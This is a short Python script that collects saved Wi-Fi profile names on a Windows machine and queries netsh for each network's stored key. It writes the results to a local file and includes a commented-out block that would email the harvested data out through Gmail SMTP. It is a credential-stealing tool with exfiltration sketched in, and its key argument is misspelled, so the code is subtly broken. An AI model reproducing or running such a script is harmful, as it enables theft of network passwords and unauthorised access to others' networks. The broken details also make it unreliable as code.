#!/usr/bin/python

import subprocess
import re
import smtplib

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
final_output = ""
for network in network_list:
            command2 = "netsh wlan show profile " + network + " key=clean"
            one_network_result = subprocess.check_output(command2, shell=True)
            final_output += one_network_result
data = open("windows_system_pass.txt", "w")
data.write(final_output)
data.close()
# send to email
"""server = smtplib.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(my_email, password)
server.sendmail(my_email, my_email, final_output)
server.quit()"""

